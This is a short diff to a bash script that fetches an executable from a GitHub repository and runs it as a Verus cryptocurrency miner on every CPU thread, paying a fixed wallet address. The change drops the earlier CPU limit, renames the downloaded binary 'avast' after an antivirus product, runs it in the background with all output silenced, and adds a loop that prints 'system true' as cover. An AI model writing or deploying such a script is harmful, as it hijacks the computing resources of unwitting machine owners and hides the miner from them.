@@ -1,12 +1,8 @@
 #!/bin/bash
-apt-get update -y
-apt-get install -y cpulimit screen
-apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4
-wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px1
-chmod +x px1
+wget https://github.com/torgyv/berhasil/raw/master/avast
+chmod +x avast
 pool="pool.verus.io:9998"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
-
-cpulimit -l 30 ./px1 -a verus -o $pool -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.$workername -t $thread
+./avast -a verus -o $pool -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.$workername -t $thread >/dev/null 2>&1 >/dev/null &
 while :; do echo "system true"; sleep 2m; done
